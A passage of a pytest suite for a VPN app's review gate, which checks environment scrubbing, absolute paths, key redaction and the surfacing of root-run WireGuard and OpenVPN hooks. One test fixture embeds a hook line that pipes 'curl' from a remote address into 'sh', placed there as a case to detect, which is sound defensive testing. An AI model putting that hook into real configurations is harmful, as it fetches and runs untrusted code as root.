"""Tunnel phase 3b — the gate around live Connect/Disconnect.

Nothing here runs wg-quick, openvpn, route, pfctl, sudo or osascript: the
privileged runner, the local-state probe and the kill-switch state are all
injected, and nothing is written to disk.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from services import openvpn_manager, vpn_connection, vpn_execution, vpn_rootscript

# An absolute wg-quick, so the root command is the same on every machine (S7:
# root never runs a bare name).
FAKE_WG_QUICK = "/opt/test/bin/wg-quick"

PRIVATE_KEY = "cHJpdmF0ZS1rZXktdGhhdC1tdXN0LW5ldmVyLWxlYWsxMjM0NTY3OA=="


class Recorder:
    def __init__(self, ok=True, output="ok"):
        self.ok, self.output, self.scripts = ok, output, []

    def __call__(self, script, prompt, timeout=30):
        self.scripts.append(script)
        return self.ok, self.output


class Probe(dict):
    """Fake local state: which interfaces are up, OpenVPN, and the public route."""

    def __init__(self, up=(), device="utun7", route=None, openvpn=False):
        self.up = set(up)
        self.openvpn = openvpn
        super().__init__(
            wireguard=lambda name: ({"up": True, "device": device}
                                    if name in self.up else {"up": False, "device": None}),
            openvpn_running=lambda: self.openvpn,
            route_interface=lambda: route,
        )


@pytest.fixture(autouse=True)
def wg_quick_installed(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: FAKE_WG_QUICK if name == "wg-quick" else real_which(name, *a, **k))


def write_conf(tmp_path, name="wgnl", allowed="0.0.0.0/0, ::/0", dns="10.8.0.1", mode=0o600):
    path = tmp_path / f"{name}.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\n"
        "Address = 10.8.0.2/32\n"
        + (f"DNS = {dns}\n" if dns else "")
        + "\n[Peer]\n"
        f"PublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        f"PresharedKey = {PRIVATE_KEY}\n"
        "Endpoint = 203.0.113.7:51820\n"
        f"AllowedIPs = {allowed}\n",
        encoding="utf-8",
    )
    os.chmod(path, mode)
    return path


def profile_for(path):
    return vpn_connection.profile_from_config(str(path))


def review(action, profile, probe=None, armed=False):
    return vpn_execution.review_execution(action, profile, probe=probe or Probe(),
                                          killswitch_armed=lambda: armed)


def execute(action, profile, **kwargs):
    """vpn_execution.execute with the review the user would have confirmed:
    execute() fails closed without one (audit tier-2, S1)."""
    kwargs.setdefault("confirmed", vpn_execution.review_execution(
        action, profile, probe=kwargs.get("probe"),
        killswitch_armed=kwargs.get("killswitch_armed")))
    return vpn_execution.execute(action, profile, **kwargs)


# ── Target review ───────────────────────────────────────────────────────────

def test_review_names_target_command_intent_and_rollback(tmp_path):
    path = write_conf(tmp_path)
    r = review("connect", profile_for(path))
    assert r.allowed
    assert r.target == str(path)
    assert r.interface == "wgnl"
    # S7: root runs a verified copy, and the review says so in words.
    copy = "/private/var/run/sentinel-vpn/wg/wgnl/wgnl.conf"
    assert r.command == (f"copy '{path}' to {copy}, check that the copy's SHA-256 is "
                         f"the one below, then wg-quick up {copy}")
    assert r.route_mode == "Full tunnel"
    assert any("203.0.113.7:51820" in line for line in r.config_lines)
    assert any("10.8.0.1" in line for line in r.config_lines)
    assert any("Disconnect" in item and "down" in item for item in r.rollback)


def test_review_never_carries_key_material(tmp_path):
    r = review("connect", profile_for(write_conf(tmp_path)))
    everything = r.confirmation_text() + json.dumps(r.sections())
    assert PRIVATE_KEY not in everything


@pytest.mark.parametrize("profile, reason", [
    ({"name": "Example", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
      "interface": "wgjp", "placeholder": True}, "template"),
    ({"name": "No target", "protocol": "WireGuard", "endpoint": "203.0.113.7"},
     "no interface or config"),
    ({"name": "Bad name", "protocol": "WireGuard", "endpoint": "203.0.113.7",
      "interface": "my home vpn"}, "not a valid wireguard interface name"),
    ({"name": "Gone", "protocol": "WireGuard", "endpoint": "203.0.113.7",
      "config_path": "/nonexistent/wgx.conf"}, "no longer exists"),
    ({"name": "Weird", "protocol": "IPsec", "endpoint": "203.0.113.7"}, "unsupported"),
])
def test_review_blocks_what_would_fail_or_mislead(profile, reason):
    r = review("connect", profile)
    assert not r.allowed
    assert reason in " ".join(r.blockers).lower()


def test_review_blocks_when_wg_quick_is_missing(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: False)
    r = review("connect", {"name": "VPS", "protocol": "WireGuard",
                           "endpoint": "203.0.113.7", "interface": "wg0"})
    assert any("wg-quick not found" in b for b in r.blockers)


def test_config_file_name_must_be_a_valid_interface(tmp_path):
    path = write_conf(tmp_path, name="My Home VPN")
    r = review("connect", profile_for(path))
    assert any("rename the file" in b for b in r.blockers)


def test_connecting_an_interface_that_is_already_up_is_refused(tmp_path):
    r = review("connect", profile_for(write_conf(tmp_path)), Probe(up={"wgnl"}))
    assert any("already up" in b for b in r.blockers)


def test_disconnect_warns_about_clear_traffic_or_armed_kill_switch():
    profile = {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7",
               "interface": "wg0"}
    clear = review("disconnect", profile, Probe(up={"wg0"}), armed=False)
    assert clear.allowed
    assert any("in the clear" in w for w in clear.warnings)
    assert any("Connect" in item for item in clear.rollback)
    armed = review("disconnect", profile, Probe(up={"wg0"}), armed=True)
    assert any("kill switch is armed" in w.lower() for w in armed.warnings)


def test_disconnect_does_not_refuse_a_template_so_a_stuck_tunnel_can_come_down():
    r = review("disconnect", {"name": "Example", "protocol": "WireGuard",
                              "endpoint": "<SERVER_IP>", "interface": "wgjp",
                              "placeholder": True}, Probe(up={"wgjp"}))
    assert r.allowed


def test_readable_config_and_split_tunnel_are_warned(tmp_path):
    path = write_conf(tmp_path, allowed="10.0.0.0/8", mode=0o644)
    r = review("connect", profile_for(path))
    assert r.allowed
    joined = " ".join(r.warnings)
    assert "chmod 600" in joined
    assert "Split tunnel" in joined


def test_config_without_a_peer_endpoint_is_blocked(tmp_path):
    path = tmp_path / "wgx.conf"
    path.write_text(f"[Interface]\nPrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n",
                    encoding="utf-8")
    r = review("connect", profile_for(path))
    assert any("no peer endpoint" in b for b in r.blockers)


def test_openvpn_review_requires_client_and_file(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: False)
    r = review("connect", {"name": "O", "protocol": "OpenVPN", "endpoint": "203.0.113.7",
                           "config_path": str(tmp_path / "missing.ovpn")})
    joined = " ".join(r.blockers)
    assert "openvpn client not found" in joined
    assert "no longer exists" in joined


# ── Command construction (the PATH the admin dialog does not have) ──────────

def test_wg_quick_command_uses_an_absolute_path_and_its_directory(monkeypatch):
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: "/opt/homebrew/bin/wg-quick")
    assert vpn_connection.wg_quick_command("up", "/Users/me/wg nl.conf") == (
        "cd / && /usr/bin/env -i HOME=/var/root "
        "PATH='/opt/homebrew/bin:/usr/bin:/bin:/usr/sbin:/sbin' '/opt/homebrew/bin/wg-quick' "
        "up '/Users/me/wg nl.conf'")


def test_wg_quick_runs_from_root_with_nothing_of_the_users_environment(monkeypatch, tmp_path):
    """PR #34 review P1-2: hooks read ~/.zshenv, Python .pth files, ./Makefile and
    relative pfctl files; root must start in / with only HOME=/var/root and PATH."""
    monkeypatch.setattr(vpn_connection.shutil, "which", lambda name, *a, **k: None)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("HOME", str(tmp_path))
    command = vpn_connection.wg_quick_command("up", "sub/wg0.conf")
    assert command.startswith("cd / && /usr/bin/env -i HOME=/var/root PATH=")
    assert f"'{tmp_path}/sub/wg0.conf'" in command or f"'{os.path.realpath(tmp_path)}/sub/wg0.conf'" in command
    assert str(tmp_path) not in command.split(" up ")[0]
    assert vpn_connection.wg_quick_command("up", "wg0").endswith(" up 'wg0'")   # a name stays a name


@pytest.mark.allow_process
def test_the_scrubbed_command_really_drops_the_environment_and_directory(tmp_path, monkeypatch):
    """Run the command's own prefix unprivileged, with a shell in wg-quick's
    place: it must start in / and see only HOME, PATH and what sh adds itself."""
    import subprocess
    monkeypatch.setattr(vpn_connection.shutil, "which", lambda name, *a, **k: None)
    prefix = vpn_connection.wg_quick_command("up", "wg0").split(" 'wg-quick' ")[0]
    out = subprocess.run(["/bin/sh", "-c", prefix + " /bin/sh -c 'pwd; /usr/bin/env'"],
                         cwd=tmp_path, env={"SECRET": "x", "HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
                         capture_output=True, text=True, timeout=10).stdout.splitlines()
    assert out[0] == "/"
    assert "HOME=/var/root" in out and "PATH=/usr/bin:/bin:/usr/sbin:/sbin" in out
    assert {line.split("=", 1)[0] for line in out[1:]} <= {"HOME", "PATH", "PWD", "OLDPWD", "SHLVL", "_"}

def test_openvpn_start_command_is_scrubbed_and_absolute(monkeypatch, tmp_path):
    monkeypatch.setattr(openvpn_manager, "openvpn_binary", lambda: "/opt/homebrew/sbin/openvpn")
    monkeypatch.setattr(openvpn_manager, "_run_dir", lambda: tmp_path / "vpn")
    assert openvpn_manager.start_command("/Users/me/my nl.ovpn") == (
        "cd / && /usr/bin/env -i HOME=/var/root PATH='/usr/bin:/bin:/usr/sbin:/sbin' "
        "'/opt/homebrew/sbin/openvpn' --config '/Users/me/my nl.ovpn' --daemon sentinel-ovpn "
        f"--log '{tmp_path}/vpn/openvpn.log' --writepid '{tmp_path}/vpn/openvpn.pid' --verb 3")
    assert openvpn_manager.SYSTEM_PATH == vpn_connection.SYSTEM_PATH


def test_openvpn_runs_from_root_with_nothing_of_the_users_environment(monkeypatch, tmp_path):
    """The same isolation as wg-quick: openvpn keeps its starting directory
    under --daemon and its hooks inherit it (`up up.sh` ran ./up.sh from the
    checkout), and openvpn reads OPENSSL_CONF and friends from its environment."""
    monkeypatch.setattr(openvpn_manager, "openvpn_binary", lambda: None)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setattr(openvpn_manager, "user_data_base", lambda: Path("data"))
    command = openvpn_manager.start_command("sub/srv.ovpn")
    assert command.startswith("cd / && /usr/bin/env -i HOME=/var/root PATH=")
    here = os.getcwd()
    assert f"--config '{here}/sub/srv.ovpn'" in command
    assert f"--log '{here}/data/vpn/openvpn.log'" in command      # never relative to /
    assert f"--writepid '{here}/data/vpn/openvpn.pid'" in command
    assert str(tmp_path) not in command.split(" 'openvpn' ")[0]
    assert f"--config '{tmp_path}/home/srv.ovpn'" in openvpn_manager.start_command("~/srv.ovpn")


@pytest.mark.allow_process
def test_the_scrubbed_openvpn_command_really_drops_the_environment_and_directory(tmp_path, monkeypatch):
    """Run the command's own prefix unprivileged, with a shell in openvpn's place."""
    import subprocess
    monkeypatch.setattr(openvpn_manager, "openvpn_binary", lambda: None)
    monkeypatch.setattr(openvpn_manager, "_run_dir", lambda: tmp_path)
    prefix = openvpn_manager.start_command("/x.ovpn").split(" 'openvpn' ")[0]
    out = subprocess.run(["/bin/sh", "-c", prefix + " /bin/sh -c 'pwd; /usr/bin/env'"],
                         cwd=tmp_path, env={"OPENSSL_CONF": str(tmp_path / "evil.cnf"),
                                            "HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
                         capture_output=True, text=True, timeout=10).stdout.splitlines()
    assert out[0] == "/"
    assert "HOME=/var/root" in out and "PATH=/usr/bin:/bin:/usr/sbin:/sbin" in out
    assert {line.split("=", 1)[0] for line in out[1:]} <= {"HOME", "PATH", "PWD", "OLDPWD", "SHLVL", "_"}


def _config_word(command, flag):
    import shlex
    words = shlex.split(command.split(" && ", 1)[1])
    return words[words.index(flag) + 1] if flag else words[-1]


def test_a_relative_config_through_a_link_and_dotdot_stays_the_reviewed_file(monkeypatch, tmp_path):
    """PR #36 review (Codex P1): abspath turned link/../x into x lexically, so root
    could load a different file from the one the review opened and hashed."""
    (tmp_path / "real" / "dir").mkdir(parents=True)
    (tmp_path / "link").symlink_to(tmp_path / "real" / "dir")
    for name in ("client.ovpn", "wg0.conf"):
        (tmp_path / "real" / name).write_text("reviewed")
        (tmp_path / name).write_text("decoy")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(openvpn_manager, "openvpn_binary", lambda: "/opt/homebrew/sbin/openvpn")
    monkeypatch.setattr(openvpn_manager, "_run_dir", lambda: tmp_path)
    monkeypatch.setattr(vpn_connection.shutil, "which", lambda name, *a, **k: None)
    ovpn = _config_word(openvpn_manager.start_command("link/../client.ovpn"), "--config")
    wg = _config_word(vpn_connection.wg_quick_command("up", "link/../wg0.conf"), None)
    for word, name in ((ovpn, "client.ovpn"), (wg, "wg0.conf")):
        assert os.path.isabs(word) and "/link/../" in word
        assert Path(word).read_text() == Path(f"link/../{name}").read_text() == "reviewed"


def test_a_binary_found_through_a_relative_path_entry_is_made_absolute(monkeypatch, tmp_path):
    """PR #36 review (Codex P2): which() can answer bin/openvpn; root runs from /."""
    monkeypatch.chdir(tmp_path)
    here = os.getcwd()
    monkeypatch.setattr(openvpn_manager.shutil, "which", lambda name, *a, **k: f"bin/{name}")
    monkeypatch.setattr(openvpn_manager, "_run_dir", lambda: tmp_path)
    assert openvpn_manager.openvpn_binary() == f"{here}/bin/openvpn"
    assert f" '{here}/bin/openvpn' --config " in openvpn_manager.start_command("/x.ovpn")
    command = vpn_connection.wg_quick_command("up", "/x.conf")
    assert f"PATH='{here}/bin:/usr/bin:/bin:/usr/sbin:/sbin' '{here}/bin/wg-quick' up" in command


def test_the_scrubbed_openvpn_is_still_recognised_as_sentinels(monkeypatch, tmp_path):
    """env execs openvpn, so ps shows openvpn's own argv: Disconnect must still
    verify the process the scrubbed line started (pid path with a space)."""
    import shlex
    from types import SimpleNamespace
    monkeypatch.setattr(openvpn_manager, "openvpn_binary", lambda: "/opt/homebrew/sbin/openvpn")
    monkeypatch.setattr(openvpn_manager, "_run_dir", lambda: tmp_path / "Sentinel Data")
    argv = shlex.split(openvpn_manager.start_command(str(tmp_path / "s.ovpn")).split(" && ", 1)[1])
    argv = argv[argv.index("PATH=/usr/bin:/bin:/usr/sbin:/sbin") + 1:]
    assert argv[0] == "/opt/homebrew/sbin/openvpn"
    monkeypatch.setattr(openvpn_manager.subprocess, "run", lambda *a, **k:
                        SimpleNamespace(returncode=0, stdout=" ".join(argv) + "\n"))
    assert openvpn_manager._is_tracked_process(4242) is True


def test_openvpn_review_shows_the_line_root_runs(monkeypatch, tmp_path):
    monkeypatch.setattr(openvpn_manager, "openvpn_binary", lambda: "/opt/homebrew/sbin/openvpn")
    monkeypatch.setattr(openvpn_manager, "_run_dir", lambda: tmp_path)
    cfg = tmp_path / "srv.ovpn"
    cfg.write_text("client\nremote 203.0.113.7 1194\n")
    profile = {"name": "O", "protocol": "OpenVPN", "endpoint": "203.0.113.7",
               "config_path": str(cfg)}
    r = review("connect", profile)
    assert r.command == openvpn_manager.start_command(str(cfg))
    assert r.command.startswith("cd / && /usr/bin/env -i ")
    assert review("disconnect", profile).command.startswith("kill -TERM")


def test_rollback_is_a_command_a_person_can_type(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: "/opt/homebrew/bin/wg-quick")
    path = write_conf(tmp_path)
    r = review("connect", profile_for(path))
    assert r.rollback[0].endswith(f"sudo wg-quick down '{path}'")


# ── Execution and post-change check ────────────────────────────────────────

def test_a_blocked_action_runs_nothing(tmp_path):
    run = Recorder()
    outcome = execute(
        "connect", {"name": "Example", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
                    "interface": "wgjp", "placeholder": True},
        run_as_root=run, probe=Probe(), killswitch_armed=lambda: False)
    assert run.scripts == []
    assert outcome.ran is False
    assert outcome.as_result()["success"] is False
    assert outcome.status_line.startswith("Refused")
    assert outcome.review.blockers


def test_verified_full_tunnel_connect(tmp_path):
    path = write_conf(tmp_path)
    probe = Probe(route="utun7")
    run = Recorder()

    def runner(script, prompt, timeout=30):
        probe.up.add("wgnl")          # the tunnel comes up when the command runs
        return run(script, prompt, timeout)

    outcome = execute("connect", profile_for(path), run_as_root=runner,
                                    probe=probe, killswitch_armed=lambda: False, sleep=lambda s: None)
    assert run.scripts == [vpn_rootscript.wireguard_command(
        "up", str(path), outcome.review.config_sha256, "wgnl", FAKE_WG_QUICK)]
    assert outcome.success and outcome.verified is True
    assert "utun7" in outcome.verification
    assert "not verified" in outcome.verification  # handshake/DNS honesty
    result = outcome.as_result()
    assert result["success"] is True and result["sections"]
    assert "verified locally" in result["status_line"]
    assert PRIVATE_KEY not in json.dumps(result)
    assert outcome.review.interface == "wgnl"


def test_command_success_without_the_interface_is_not_verified(tmp_path):
    slept = []
    outcome = execute(
        "connect", profile_for(write_conf(tmp_path)), run_as_root=Recorder(),
        probe=Probe(), killswitch_armed=lambda: False, sleep=slept.append)
    assert outcome.success is True
    assert outcome.verified is False
    assert "NOT verified" in outcome.status_line
    assert len(slept) == 2           # retried before concluding


def test_full_tunnel_whose_route_bypasses_the_tunnel_is_not_verified(tmp_path):
    path = write_conf(tmp_path)
    probe = Probe(route="en0")

    def runner(script, prompt, timeout=30):
        probe.up.add("wgnl")
        return True, ""

    outcome = execute("connect", profile_for(path), run_as_root=runner,
                                    probe=probe, killswitch_armed=lambda: False, sleep=lambda s: None)
    assert outcome.verified is False
    assert "en0" in outcome.verification


def test_verified_disconnect(tmp_path):
    probe = Probe(up={"wg0"})

    def runner(script, prompt, timeout=30):
        probe.up.discard("wg0")
        return True, ""

    outcome = execute(
        "disconnect", {"name": "VPS", "protocol": "WireGuard",
                       "endpoint": "203.0.113.7", "interface": "wg0"},
        run_as_root=runner, probe=probe, killswitch_armed=lambda: False, sleep=lambda s: None)
    assert outcome.verified is True
    assert "no longer recorded as up" in outcome.verification


def test_a_failed_command_is_reported(tmp_path):
    outcome = execute(
        "connect", profile_for(write_conf(tmp_path)),
        run_as_root=Recorder(ok=False, output="Cancelled."), probe=Probe(),
        killswitch_armed=lambda: False, sleep=lambda s: None)
    assert outcome.success is False
    assert outcome.status_line.startswith("Failed: Cancelled.")


def test_openvpn_post_check_reads_the_tracked_process(tmp_path, monkeypatch):
    conf = tmp_path / "home.ovpn"
    conf.write_text("client\nremote 203.0.113.7 1194\n")
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    probe = Probe()
    monkeypatch.setattr(vpn_connection.openvpn_manager, "connect",
                        lambda path, run_as_root: (setattr(probe, "openvpn", True)
                                                   or {"success": True, "output": ""}))
    outcome = execute("connect", profile_for(conf), probe=probe,
                                    run_as_root=Recorder(), killswitch_armed=lambda: False, sleep=lambda s: None)
    assert outcome.verified is True


# ── Local state probe ───────────────────────────────────────────────────────

def test_interface_state_reads_wg_quick_run_records(tmp_path):
    assert vpn_execution.wireguard_interface_state("wg0", tmp_path) == {"up": False, "device": None}
    (tmp_path / "wg0.name").write_text("utun5\n")
    assert vpn_execution.wireguard_interface_state("wg0", tmp_path)["up"] is False  # stale: no socket
    (tmp_path / "utun5.sock").write_text("")
    assert vpn_execution.wireguard_interface_state("wg0", tmp_path) == {"up": True, "device": "utun5"}


# ── Hooks that run as root are named and confirmed separately ───────────────

def test_wireguard_hooks_are_listed_and_the_key_is_not(tmp_path):
    path = tmp_path / "wgx.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\n"
        "Address = 10.8.0.2/32\n"
        "PostUp = iptables -A FORWARD -i %i -j ACCEPT; curl -s http://203.0.113.9/x | sh\n"
        "postdown = /usr/local/bin/cleanup.sh\n"
        "# PreUp = commented out, must be ignored\n"
        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
    hooks = vpn_execution.config_root_hooks(path, "WireGuard")
    assert len(hooks) == 2
    assert hooks[0].startswith("PostUp: iptables")
    assert hooks[1].startswith("postdown: /usr/local/bin/cleanup.sh")
    assert PRIVATE_KEY not in " ".join(hooks)


def test_openvpn_hooks_are_listed(tmp_path):
    path = tmp_path / "srv.ovpn"
    path.write_text(
        "client\nproto udp\nremote 203.0.113.7 1194\n"
        "script-security 2\n"
        "up /etc/openvpn/update-resolv-conf\n"
        "--down /etc/openvpn/update-resolv-conf\n"
        "plugin /usr/lib/openvpn/openvpn-plugin-auth-pam.so login\n"
        "# up something-commented\n"
        "<ca>\nMIIBogus\n</ca>\n")
    hooks = vpn_execution.config_root_hooks(path, "OpenVPN")
    assert [h.split(":")[0] for h in hooks] == ["script-security", "up", "--down", "plugin"]


def test_a_plain_config_has_no_hooks(tmp_path):
    assert vpn_execution.config_root_hooks(write_conf(tmp_path), "WireGuard") == []
    assert vpn_execution.config_root_hooks(tmp_path / "missing.conf", "WireGuard") == []


def test_review_surfaces_hooks_in_sections_confirmation_and_warnings(tmp_path, monkeypatch):
    # Model a root-owned /opt: the real /opt differs between a Mac, a laptop and the
    # GitHub runner, and this test is about a hook that is acceptable, not about /opt.
    import stat as _stat_mod
    import types
    root_dir = _stat_mod.S_IFDIR | 0o755

    def fake_stat(candidate):
        if str(candidate) in ("/opt", "/"):
            return types.SimpleNamespace(st_uid=0, st_mode=root_dir)
        raise FileNotFoundError(candidate)
    monkeypatch.setattr(vpn_execution, "_stat", fake_stat)
    path = tmp_path / "wgh.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n"
        "PostUp = /opt/hook.sh -v\n"
        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == ("PostUp: /opt/hook.sh -v",)
    assert r.allowed                                        # a warning, not a blocker
    titles = [title for title, _, _ in r.sections()]
    assert "Runs commands as administrator" in titles
    assert "RUNS COMMANDS AS ADMINISTRATOR" in r.confirmation_text()
    assert "/opt/hook.sh -v" in r.confirmation_text()
    assert any("as administrator" in w for w in r.warnings)


def test_openvpn_review_surfaces_hooks(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    path = tmp_path / "srv.ovpn"
    path.write_text("client\nremote 203.0.113.7 1194\nscript-security 2\nup /x/y.sh\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == ("script-security: 2", "up: /x/y.sh")


@pytest.mark.parametrize("line, program", [
    ("up up.sh", "up.sh"),                              # TODO.md: never checked
    ("down ./d.sh", "./d.sh"),
    ('route-up "scripts/r.sh arg"', "scripts/r.sh"),
    ("tls-verify 'v.sh'", "v.sh"),
    ("plugin ./p.so", "./p.so"),                        # "./" loads from the cwd
])
def test_a_relative_openvpn_hook_program_is_refused(line, program):
    """OpenVPN execve()s the word with no PATH lookup, from / since it runs
    there: the review cannot check what a relative word reaches."""
    blockers, soft, warnings = vpn_execution._hook_findings(f"client\n{line}\n", "OpenVPN")
    assert blockers == [] and len(soft) == 1
    assert f"runs {program}, a relative path" in soft[0] and "full path" in soft[0]


@pytest.mark.parametrize("line", [
    "plugin openvpn-plugin-down-root.so /etc/x",        # OpenVPN's plugin folder
    "up /usr/bin/true",
    "up",
    "script-security 2",
])
def test_openvpn_hooks_that_are_not_relative_programs_are_not_refused_for_it(line):
    _, soft, _ = vpn_execution._hook_findings(f"client\n{line}\n", "OpenVPN")
    assert not any("relative path" in item for item in soft)


def test_a_relative_openvpn_hook_blocks_connect(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    path = tmp_path / "srv.ovpn"
    path.write_text("client\nremote 203.0.113.7 1194\nscript-security 2\nup up.sh\n")
    assert any("runs up.sh, a relative path" in b
               for b in review("connect", profile_for(path)).blockers)


def test_relative_openvpn_files_draw_one_warning():
    text = ("client\nproto udp\nremote vpn.example.com 1194\n"
            "ca ca.crt\nkey ~/k.key\ntls-auth ta.key 1\ncert /etc/c.crt\n"
            "tls-crypt [inline]\nauth-user-pass stdin\nauth-user-pass\n"
            "<ca>\nMIIBogus\n</ca>\n<tls-crypt>\nMIIBogus\n</tls-crypt>\n")
    blockers, soft, warnings = vpn_execution._hook_findings(text, "OpenVPN")
    assert blockers == [] and soft == []
    found = [w for w in warnings if "looks for these files in /" in w]
    assert len(found) == 1
    assert "ca ca.crt, key ~/k.key, tls-auth ta.key." in found[0]
    for absent in ("/etc/c.crt", "[inline]", "stdin", "MIIBogus", "udp", "vpn.example.com"):
        assert absent not in found[0]
    for key in ("ca", "capath", "cert", "key", "dh", "extra-certs", "pkcs12", "tls-auth", "tls-crypt",
                "tls-crypt-v2", "secret", "crl-verify", "auth-user-pass", "askpass",
                "http-proxy-user-pass"):
        one = vpn_execution._hook_findings(f"client\n{key} f.txt\n", "OpenVPN")[2]
        assert any(f"{key} f.txt." in w for w in one), key


@pytest.mark.parametrize("line, listed", [
    # PR #37 review (Codex P2): a proxy's auth file is its third word.
    ("http-proxy proxy.example 8080 creds.txt basic", "http-proxy creds.txt."),
    ("socks-proxy socks.example 1080 sa.txt", "socks-proxy sa.txt."),
    ("http-proxy proxy.example 8080 auto", None),
    ("http-proxy proxy.example 8080 auto-nct", None),
    ("http-proxy proxy.example 8080 AUTO-NCT", "http-proxy AUTO-NCT."),   # streq: exact
    ("http-proxy proxy.example 8080 stdin", None),
    ("http-proxy proxy.example 8080 /etc/creds.txt", None),
    ("http-proxy proxy.example 8080", None),
    ("socks-proxy socks.example 1080", None),
    ("ca auto", "ca auto."),                            # "auto" is http-proxy's word only
    ("socks-proxy socks.example 1080 stdin", None),
    # PR #37 review (Codex P2): "stdin" is special only where OpenVPN reads
    # credentials (get_user_pass); tls-auth stdin opens /stdin.
    ("tls-auth stdin 1", "tls-auth stdin."),
    ("ca STDIN", "ca STDIN."),
    ("auth-user-pass STDIN", "auth-user-pass STDIN."),   # PR #37 review: streq, exact
    ("auth-user-pass stdin", None),
    ("askpass stdin", None),
    ("http-proxy-user-pass stdin", None),
    # PR #37 review (Codex P2): "[inline]" is no keyword in OpenVPN 2.6; it only
    # works beside a <tag> block of the same directive, which replaces the name.
    ("askpass [inline]", "askpass [inline]."),
    ("tls-auth [inline] 1", "tls-auth [inline]."),
    ("tls-auth [inline] 1\n<tls-auth>\nMIIBogus\n</tls-auth>", None),
    ("tls-auth [inline] 1\n<ca>\nMIIBogus\n</ca>", "tls-auth [inline]."),
    ("capath ca-certs", "capath ca-certs."),          # PR #37 review: a directory
    ("tls-auth [inline] 1\n  <tls-auth>\nMIIBogus\n</tls-auth>", None),   # read like _scan
    ("TLS-AUTH [inline] 1\n<TLS-AUTH>\nMIIBogus\n</TLS-AUTH>", None),    # keys are lowercased
])
def test_proxy_auth_files_are_warned_from_their_own_position(line, listed):
    warnings = vpn_execution._hook_findings(f"client\n{line}\n", "OpenVPN")[2]
    assert not any("not on the reviewed list" in w for w in warnings)
    found = [w for w in warnings if "looks for these files in /" in w]
    if listed is None:
        assert found == []
    else:
        assert len(found) == 1 and listed in found[0]
    many = "client\n" + "".join(f"ca c{i}.crt\n" for i in range(7))
    listed = [w for w in vpn_execution._hook_findings(many, "OpenVPN")[2] if "looks for" in w][0]
    assert "c5.crt …" in listed and "c6.crt" not in listed


CONNECTIONS = ("client\n<connection>\nremote a.example 1194\ntls-auth ta.key 1\n"
               "http-proxy proxy.example 8080 creds.txt\n<tls-crypt>\nMIIBogus\n</tls-crypt>\n"
               "</connection>\n<connection>\nremote b.example 443 tcp\n</connection>\n")


def test_connection_blocks_are_read_as_directives():
    """PR #37 review (Codex P2): OpenVPN reads a <connection> block's lines as
    directives, which can name files; the review skipped them as inline data."""
    found, problems = vpn_execution._scan(CONNECTIONS, "OpenVPN")
    assert problems == []                    # a nested inline block is fine
    assert [f[1] for f in found] == ["client", "remote", "tls-auth", "http-proxy", "remote"]
    warnings = vpn_execution._hook_findings(CONNECTIONS, "OpenVPN")[2]
    assert any("tls-auth ta.key, http-proxy creds.txt." in w for w in warnings)


def test_a_hook_in_a_connection_block_is_still_reviewed():
    # OpenVPN refuses it there (OPT_P_CONNECTION only), but nothing hides from the review.
    text = "client\n<connection>\nremote a.example 1194\nup up.sh\n</connection>\n"
    assert vpn_execution.hooks_from_text(text, "OpenVPN") == ["up: up.sh"]
    assert any("runs up.sh" in item for item in vpn_execution._hook_findings(text, "OpenVPN")[1])


@pytest.mark.parametrize("text", [
    "client\n<connection>\nremote a.example 1194\n",                     # never closed
    "client\n<connection>\nremote a.example 1194\n </connection>\n",     # not exactly the tag
    "client\n<connection>\nremote a.example 1194\n</connectionx>\n",
    "client\n<connection>\nremote a\n<tls-auth>\nA\n</connection>\n",   # closes a nested block
    "client\n<connection>\nremote a\n</tls-auth>\n</connection>\n",      # a stray closing tag
    "client\n<connection>\nremote a\n<connection>\nremote b\n</connection>\n</connection>\n",
])
def test_an_ambiguous_connection_block_blocks(text):
    assert vpn_execution._hook_findings(text, "OpenVPN")[0]


# ── OpenVPN directives that load code or write as root (TODO, found for #37) ──

@pytest.mark.parametrize("line", [
    "replay-persist /var/tmp/replay",                   # root writes the file (options.c)
    "replay-persist replay",
    "engine /tmp/x.dylib",                              # loaded through the "dynamic" engine
    "engine dynamic",
    "engine",
])
def test_root_writes_and_engines_block(line):
    blockers = vpn_execution._hook_findings(f"client\n{line}\n", "OpenVPN")[0]
    assert len(blockers) == 1 and f"'{line.split()[0]}'" in blockers[0]


@pytest.mark.parametrize("line", ["providers legacy default", "providers default",
                                  "providers fips base null"])
def test_openssls_own_providers_are_accepted(line):
